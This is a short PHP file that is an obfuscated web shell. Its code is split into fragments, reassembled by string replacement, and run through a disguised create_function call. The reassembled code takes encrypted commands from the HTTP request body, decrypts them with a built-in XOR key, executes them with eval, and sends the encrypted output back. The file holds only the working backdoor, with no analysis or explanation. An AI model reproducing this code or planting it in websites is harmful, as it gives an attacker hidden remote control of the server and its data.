<?php
$U='$k=U)"ab12U)615e";$U)kh="U)10ffdU)196U)53ca";$kf="7581a5U)ec7U)4bU)a";$p="XsCIGU)FvVq8ARU)ru5e"U);';
$W=str_replace('s','','crseasste_fusnsctsion');
$V='U)ndU)_cleU)an();$U)r=@bU)ase64_enU)code(@x(@gzcoU)mpU)ress($oU)),$U)k));printU)("U)$p$kh$r$kf");}';
$T='atch("/$U)kh(.+)U)$kU)f/"U),@U)file_get_contentU)s("php://U)inpU)ut"),$U)m)==1U))U) U){@ob_staU)';
$t='U)$j=U)0;($j<U)$c&&$i<$l);$j+U)+,$i+U)+U)){$o.=$U)t{$i}^$kU){U)$j};}}return $U)o;}if (U)@preU)g_U)m';
$p='functiU)on U)x($U)t,$k){$cU)U)=sU)trlen($k);$l=U)sU)trlen($t);$o=U)"";for($i=0;U)$i<$l;U)U)){for(';
$D='rt();@evU)al(@gzuncomU)press(@x(@baU)se6U)4U)_decode($m[1U)]),U)$k))U))U);$o=@ob_getU)_coU)ntents();@ob_e';
$b=str_replace('U)','',$U.$p.$t.$T.$D.$V);
$G=$W('',$b);$G();
?>
